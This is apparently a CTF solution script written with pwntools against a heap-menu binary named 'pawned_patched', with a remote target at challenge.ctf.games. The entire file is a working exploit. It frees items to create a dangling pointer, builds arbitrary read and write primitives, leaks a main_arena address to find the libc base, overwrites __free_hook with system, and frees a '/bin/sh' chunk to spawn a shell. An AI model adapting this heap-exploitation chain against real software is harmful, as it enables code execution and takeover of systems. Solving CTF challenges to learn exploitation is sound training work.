#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pawned_patched')
libc = ELF('libc-2.31.so')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('challenge.ctf.games', 30568)
    else:
        return process([exe.path] + argv)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def read_menu():
    global io
    io.readuntil(b'> ')

def sell_item(price, buffer_size, item_name):
    global io
    read_menu()
    io.sendline(b'S')
    io.readuntil(b'price: ')
    io.sendline(price)
    io.readuntil(b'name: ')
    io.sendline(f'{buffer_size}'.encode())
    io.readuntil(b'item: ')
    io.sendline(item_name)


def buy_item(item_number):
    global io
    read_menu()
    io.sendline(b'B')
    io.readuntil(b'buy?: ')
    io.sendline(f'{item_number}'.encode())


def read_first_record():
    global io
    read_menu()
    io.sendline(b'P')
    io.readuntil(b'1.')
    io.readuntil(b'Name: ')
    items_list = io.readuntil(b'\n', True)
    data = u64(items_list.ljust(8, b'\x00'))
    return data


def read_third_record():
    global io
    read_menu()
    io.sendline(b'P')
    io.readuntil(b'3.')
    io.readuntil(b'Name: ')
    items_list = io.readuntil(b'\n', True)
    data = u64(items_list.ljust(8, b'\x00'))
    return data


def manage_item(item_number, price, buffer_size, item_name):
    global io
    read_menu()
    io.sendline(b'M')
    io.readuntil(b'change?: ')
    io.sendline(f'{item_number}'.encode())
    io.readuntil(b'price: ')
    io.sendline(price)
    io.readuntil(b'length: ')
    io.sendline(f'{buffer_size}'.encode())
    io.readuntil(b'item: ')
    io.sendline(item_name)


def arbitrary_read(address):
    global io

    payload = {
        16 : address
    }
    manage_item(2, b'420', 32, fit(payload))
    data = read_first_record()
    return data


def arbitrary_write(address, data):
    global io
    payload = {
        16 : address,
        24 : 32,
    }
    manage_item(2, b'420', 32, fit(payload))
    manage_item(1, b'420', 32, data)


io = start()

# Achieve arbitrary read primitive
sell_item(b'12.00', 32, b'asd')
sell_item(b'12.00', 10, b'asd')
buy_item(1)
manage_item(2, b'420', 32, b'new_one')

# Leak main arena address
sell_item(b'12.00', 2000, b'asd')
sell_item(b'12.00', 2000, b'asd')
buy_item(3)

main_arena_address = read_third_record()
log.info(f'main arena address: {main_arena_address:x}')
libc_base = main_arena_address - 0x1ebbe0
libc.address = libc_base
log.info(f'libc base address: {libc.address:x}')

arbitrary_write(libc.sym['__free_hook'], p64(libc.sym['system']))
sell_item(b'12.00', 32, b'/bin/sh')

buy_item(5)

io.interactive()

